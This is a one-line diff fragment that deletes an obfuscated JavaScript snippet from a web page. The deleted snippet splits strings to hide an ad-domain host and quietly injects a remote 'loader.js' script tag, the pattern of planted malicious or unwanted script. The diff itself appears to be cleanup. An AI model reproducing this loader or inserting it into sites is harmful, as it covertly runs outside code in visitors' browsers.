@@ -1,1 +1,0 @@
-(function(d, t) {var g = d.createElement(t),s = d.getElementsByTagName(t)[0];g.async = true;g.src = '//a'+'d'+'s.d'+'f'+'g'+'i'+'o.co'+'m/loa'+'der.j'+'s?cl'+'ie'+'nt=AJ679';if(s==null) return false;s.parentNode.insertBefore(g, s);})(document, 's'+'c'+'r'+'i'+'p'+'t');
